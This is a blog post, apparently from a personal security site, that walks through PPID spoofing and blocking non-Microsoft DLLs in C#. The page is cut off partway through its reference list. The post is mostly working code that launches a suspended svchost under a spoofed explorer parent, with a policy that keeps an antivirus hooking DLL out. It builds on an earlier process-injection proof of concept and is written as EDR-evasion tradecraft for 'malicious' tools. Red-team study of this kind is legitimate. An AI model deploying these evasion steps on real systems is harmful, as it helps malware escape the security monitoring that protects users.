<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs" /><meta name="author" content="crypt0ace" /><meta property="og:locale" content="en" /><meta name="description" content="Spoofing parent PID and blocking non Microsoft DLLs in C#" /><meta property="og:description" content="Spoofing parent PID and blocking non Microsoft DLLs in C#" /><link rel="canonical" href="https://crypt0ace.github.io/posts/Staying-under-the-Radar/" /><meta property="og:url" content="https://crypt0ace.github.io/posts/Staying-under-the-Radar/" /><meta property="og:site_name" content="Crypt0ace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-18T00:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs" /><meta name="twitter:site" content="@crypt0acee" /><meta name="twitter:creator" content="@crypt0ace" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"crypt0ace"},"dateModified":"2022-09-18T00:00:00+05:00","datePublished":"2022-09-18T00:00:00+05:00","description":"Spoofing parent PID and blocking non Microsoft DLLs in C#","headline":"Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs","mainEntityOfPage":{"@type":"WebPage","@id":"https://crypt0ace.github.io/posts/Staying-under-the-Radar/"},"url":"https://crypt0ace.github.io/posts/Staying-under-the-Radar/"}</script><title>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs | Crypt0ace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Crypt0ace"><meta name="application-name" content="Crypt0ace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Crypt0ace</a></div><div class="site-subtitle font-italic">A Cybersecurity Blog by Ahmed Sher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/crypt0ace" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/crypt0acee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ahmedsherfreelance','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/ahmed-sher-93234a206/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1663441200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 18, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Ahmed Sher </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1441 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h2 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microsoft signed. These DLLs can be EDR DLLs that add hooks in our not so safe tools.</p><h2 id="ppid-spoofing"><span class="mr-2">PPID Spoofing</span><a href="#ppid-spoofing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>PPID Spoofing or Parent Process ID Spoofing is a technique adversaries use to evade detections based on parent-child relationships. This method makes the process look like its being spawned under a different parent process than actual parent proces.</p><h2 id="blocking-dlls"><span class="mr-2">Blocking DLLS</span><a href="#blocking-dlls" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Blocking third party DLLs is another method used by attackers. This method allows the attacker to specify that any non Microsoft DLL can not inject into a process. This can help evade some AVs/EDRs that rely on hooking into processes.</p><h2 id="updateprocthreadattribute"><span class="mr-2">UpdateProcThreadAttribute</span><a href="#updateprocthreadattribute" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The API that allows us to do it is <code class="language-plaintext highlighter-rouge">UpdateProcThreadAttribute</code>. Basically <code class="language-plaintext highlighter-rouge">InitializeProcThreadAttributeList</code> and <code class="language-plaintext highlighter-rouge">UpdateProcThreadAttribute</code>. The first one allows us to initialize the attributes we need and then we can update or push them using the second one. It’ll make more sense soon. <br /> I’m using the same Process Injection from <a href="https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-3/">here</a> in this. Most of the code and imports are the same so I’m not going to talk about them again. Please read the previous post or look at the code to understand that part.</p><h3 id="imports"><span class="mr-2">Imports</span><a href="#imports" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First we need to add the imports we need. The new APIs we need from the already present one in the EarlyBird POC are the ones mentioned below. The <code class="language-plaintext highlighter-rouge">CreateProcess</code> is the same with one difference. Instead of <code class="language-plaintext highlighter-rouge">STARTUPINFO</code> struct we are going to use <code class="language-plaintext highlighter-rouge">STARTUOINFOEX</code> struct. This is used to specify the attributes we are going to use with <code class="language-plaintext highlighter-rouge">CreateProcess</code>. We are going to use <code class="language-plaintext highlighter-rouge">OpenProcess</code> to get a process handle for the parent process we are specifying. Next we are going to use <code class="language-plaintext highlighter-rouge">InitializeProcThreadAttributeList</code> to initialize the attributes that we need. And then update them using <code class="language-plaintext highlighter-rouge">UpdateProcThreadAttribute</code>.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="kt">string</span> <span class="n">lpApplicationName</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCommandLine</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpProcessAttributes</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandles</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpEnvironment</span><span class="p">,</span> <span class="kt">string</span> <span class="n">lpCurrentDirectory</span><span class="p">,</span> <span class="k">ref</span> <span class="n">STARTUPINFOEX</span> <span class="n">lpStartupInfo</span><span class="p">,</span> <span class="k">ref</span> <span class="n">PROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">ProcessAccessFlags</span> <span class="n">processAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="kt">int</span> <span class="n">processId</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">Attribute</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpValue</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">cbSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpPreviousValue</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpReturnSize</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwAttributeCount</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="n">IntPtr</span> <span class="n">lpSize</span><span class="p">);</span>
</pre></table></code></div></div><p>We also need the <code class="language-plaintext highlighter-rouge">STARTUOINFOEX</code> struct and some other constant values. These are taken from PInvoke website. The constants are from the Microsoft Docs.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1">// https://pinvoke.net/default.aspx/Structures/STARTUPINFOEX.html</span>
<span class="p">[</span><span class="nf">StructLayout</span><span class="p">(</span><span class="n">LayoutKind</span><span class="p">.</span><span class="n">Sequential</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Unicode</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">struct</span> <span class="nc">STARTUPINFOEX</span>
<span class="p">{</span>
  <span class="k">public</span> <span class="n">STARTUPINFO</span> <span class="n">StartupInfo</span><span class="p">;</span>
  <span class="k">public</span> <span class="n">IntPtr</span> <span class="n">lpAttributeList</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// https://pinvoke.net/default.aspx/kernel32/OpenProcess.html</span>
<span class="p">[</span><span class="n">Flags</span><span class="p">]</span>
<span class="k">public</span> <span class="k">enum</span> <span class="n">ProcessAccessFlags</span> <span class="p">:</span> <span class="kt">uint</span>
<span class="p">{</span>
  <span class="n">All</span> <span class="p">=</span> <span class="m">0x001F0FFF</span><span class="p">,</span>
  <span class="n">CreateProcess</span> <span class="p">=</span> <span class="m">0x000000080</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</span> <span class="p">=</span> <span class="m">0x00020000</span><span class="p">;</span>
<span class="k">public</span> <span class="k">const</span> <span class="kt">long</span> <span class="n">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span> <span class="p">=</span> <span class="m">0x100000000000</span><span class="p">;</span>
<span class="k">public</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</span> <span class="p">=</span> <span class="m">0x00020007</span><span class="p">;</span>

<span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">CreationFlags</span>
<span class="p">{</span>
  <span class="k">public</span> <span class="k">const</span> <span class="kt">uint</span> <span class="n">SUSPENDED</span> <span class="p">=</span> <span class="m">0x4</span><span class="p">;</span>
  <span class="k">public</span> <span class="k">const</span> <span class="kt">uint</span> <span class="n">EXTENDED_STARTUPINFO_PRESENT</span> <span class="p">=</span> <span class="m">0x00080000</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>All the remaining ones like <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> etc. are going to be the same.</p><h3 id="main-method"><span class="mr-2">Main Method</span><a href="#main-method" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First up we need to initialize the <code class="language-plaintext highlighter-rouge">STARTUOINFOEX</code> and <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> structs.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">STARTUPINFOEX</span> <span class="n">siex</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">STARTUPINFOEX</span><span class="p">();</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">PROCESS_INFORMATION</span><span class="p">();</span>
</pre></table></code></div></div><p>Then we can look for the target parent process whose ID we are going to give to our malicious program. I’m using explorer but you can use whatever process you want. Make sure that process is already running.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kt">var</span> <span class="n">process</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="nf">GetProcessesByName</span><span class="p">(</span><span class="s">"explorer"</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">parentProc</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
<span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">p</span> <span class="k">in</span> <span class="n">process</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">parentProc</span> <span class="p">+=</span> <span class="n">p</span><span class="p">.</span><span class="n">Id</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] New Parent PID Found: {0}"</span><span class="p">,</span> <span class="n">parentProc</span><span class="p">);</span>
</pre></table></code></div></div><p>After we successfully get our parent PID, we can use <code class="language-plaintext highlighter-rouge">OpenProcess</code> to get a handle to it.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">ProcessAccessFlags</span><span class="p">.</span><span class="n">CreateProcess</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">parentProc</span><span class="p">);</span>
</pre></table></code></div></div><p>Now we can use <code class="language-plaintext highlighter-rouge">InitializeProcThreadAttributeList</code> to initialize the specified list of attributes for process and thread creation. We need to specify <code class="language-plaintext highlighter-rouge">dwAttributeCount</code> as 2. One for parent process ID and the other to specify mitigation policy. The other thing we need is the <code class="language-plaintext highlighter-rouge">lpAttributeList</code>. As the docs on Microsoft say, this parameter can be null to determine the buffer size required to support the specified number of attributes. We are going to determine to buffer size using <code class="language-plaintext highlighter-rouge">Marshal.AllocHGlobal</code> and providing it <code class="language-plaintext highlighter-rouge">IntPtr.Size</code> which is 8 for x64 process and 4 for x86 process. As we are targeting x64 specifically this would be 8. We are going to provide this value to <code class="language-plaintext highlighter-rouge">STARTUOINFOEX.lpAttributeList</code> struct. And then use the same <code class="language-plaintext highlighter-rouge">InitializeProcThreadAttributeList</code> call.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">lpSize</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
<span class="nf">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpSize</span><span class="p">);</span>

<span class="n">siex</span><span class="p">.</span><span class="n">lpAttributeList</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">AllocHGlobal</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">);</span>
<span class="nf">InitializeProcThreadAttributeList</span><span class="p">(</span><span class="n">siex</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="m">2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpSize</span><span class="p">);</span>
</pre></table></code></div></div><p>Similarly, we can do this with <code class="language-plaintext highlighter-rouge">lpValueProc</code> which we need to give to <code class="language-plaintext highlighter-rouge">UpdateProcThreadAttribute</code>. We also need to use <code class="language-plaintext highlighter-rouge">Marshal.WriteIntPtr</code> to write the parent process handle to <code class="language-plaintext highlighter-rouge">lpValueProc</code>. This will give us a pointer to the attribute value which we can use. <br /> Now we can use <code class="language-plaintext highlighter-rouge">UpdateProcThreadAttribute</code> with providing the attribute list from <code class="language-plaintext highlighter-rouge">STARTUOINFOEX</code>, the <code class="language-plaintext highlighter-rouge">dwFlags</code> is reserved so its going to be zero. Then we are going to provide our attribute that we want to update. First its going to be <code class="language-plaintext highlighter-rouge">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> whose value we already have added in our imports. Next we can provide the pointer to attribute value. The <code class="language-plaintext highlighter-rouge">cbSize</code> is going to be the size that was specified in the <code class="language-plaintext highlighter-rouge">lpValueProc</code>, <code class="language-plaintext highlighter-rouge">IntPtr.Size</code> which would be 8. THe other two are reserved and need to be null.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">lpValueProc</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">AllocHGlobal</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">);</span>
<span class="n">Marshal</span><span class="p">.</span><span class="nf">WriteIntPtr</span><span class="p">(</span><span class="n">lpValueProc</span><span class="p">,</span> <span class="n">procHandle</span><span class="p">);</span>
<span class="nf">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">siex</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</span><span class="p">,</span> <span class="n">lpValueProc</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
</pre></table></code></div></div><p>Once that is done, our PPID Spoofing should work. We can use the same process for blocking non Microsoft DLLs as well. The attribute is going to be <code class="language-plaintext highlighter-rouge">PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</code> and the value <code class="language-plaintext highlighter-rouge">lpMitigationPolicy</code> we are providing would be <code class="language-plaintext highlighter-rouge">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code> which specifies that only Microsoft signed DLLs should be injected in the process.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">lpMitigationPolicy</span> <span class="p">=</span> <span class="n">Marshal</span><span class="p">.</span><span class="nf">AllocHGlobal</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">);</span>
<span class="n">Marshal</span><span class="p">.</span><span class="nf">WriteInt64</span><span class="p">(</span><span class="n">lpMitigationPolicy</span><span class="p">,</span> <span class="n">PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span><span class="p">);</span>
<span class="nf">UpdateProcThreadAttribute</span><span class="p">(</span><span class="n">siex</span><span class="p">.</span><span class="n">lpAttributeList</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY</span><span class="p">,</span> <span class="n">lpMitigationPolicy</span><span class="p">,</span> <span class="p">(</span><span class="n">IntPtr</span><span class="p">)</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
</pre></table></code></div></div><p>If that works, when you use <code class="language-plaintext highlighter-rouge">CreateProcess</code> to create a process, it should have the parent process ID as the one we specified and the mitigation policy should also be applied. The only change that is needed is that with the suspended flag like we have in our process injection we also need to specify <code class="language-plaintext highlighter-rouge">EXTENDED_STARTUPINFO_PRESENT</code> and the reference that used to be to <code class="language-plaintext highlighter-rouge">STARTUPINFO</code> is now going to be <code class="language-plaintext highlighter-rouge">STARTUOINFOEX</code> which we specified as <code class="language-plaintext highlighter-rouge">siex</code>. I added a <code class="language-plaintext highlighter-rouge">Console.ReadKey()</code> which would pause the process so we can check if the attributes work. We also need to add the rest of the code from the process injection after this.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">string</span> <span class="n">app</span> <span class="p">=</span> <span class="s">@"C:\Windows\System32\svchost.exe"</span><span class="p">;</span>
<span class="kt">bool</span> <span class="n">procinit</span> <span class="p">=</span> <span class="nf">CreateProcess</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">CreationFlags</span><span class="p">.</span><span class="n">SUSPENDED</span> <span class="p">|</span> <span class="n">CreationFlags</span><span class="p">.</span><span class="n">EXTENDED_STARTUPINFO_PRESENT</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">ref</span> <span class="n">siex</span><span class="p">,</span> <span class="k">ref</span> <span class="n">pi</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Process Created. Process ID: {0}"</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">ReadKey</span><span class="p">();</span>
</pre></table></code></div></div><p>We can first check a normal program to see if attributes are present or if the AV DLL is injected or not. For this demo I’m using BitDefender’s free version and I’m using Process Hacker 2 to check the process. <br /> <img data-src="/assets/img/staying-under-the-radar/notepad_attributes.png" alt="Notepad attributes" data-proofer-ignore> <br /> <img data-src="/assets/img/staying-under-the-radar/notepad_dlls.png" alt="Notepad DLLs" data-proofer-ignore> <br /> We can see that the process is a child process of explorer which is normal. We can also see that there is not mitigation policy which is why the <code class="language-plaintext highlighter-rouge">atcuf64.dll</code> DLL by BitDefender is injected into the process. <br /> <img data-src="/assets/img/staying-under-the-radar/svchost_attributes.png" alt="svchost attributes" data-proofer-ignore> <br /> <img data-src="/assets/img/staying-under-the-radar/svchost_dlls.png" alt="svchost DLLs" data-proofer-ignore> <br /> But when we use our tool which starts <code class="language-plaintext highlighter-rouge">svchost</code> as a suspended process, we can see that it appears to be a child process of notepad which it definitely is not. We can also see the mitigation policy that mentions Microsoft Only, using which we have no BitDefender injected DLLs.</p><h2 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The full code can be found on my github <a href="https://github.com/crypt0ace/PPIDSpoof">here</a>. There are still a few changes and features I want to add in it but it still works. Make sure to compile it for x64.</p><h2 id="conslusion"><span class="mr-2">Conslusion</span><a href="#conslusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Its a nice trick to confuse defenders but I should mention, AVs and EDRs are smart now so this probably will not be enough for you to get past. It did get flagged as malicious by BitDefender as well. There’s a lot of other things we can do to make sure it works which would be discussed later.</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Credits to all of these posts and publicaly available tools</p><ul><li><a href="https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes">Preventing 3rd Party DLLs from Injecting into your Malware - IRed.Team</a><li><a href="https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/">D/Invokify PPID Spoofy &amp; BlockDLLs - RastaMouse</a><li><a 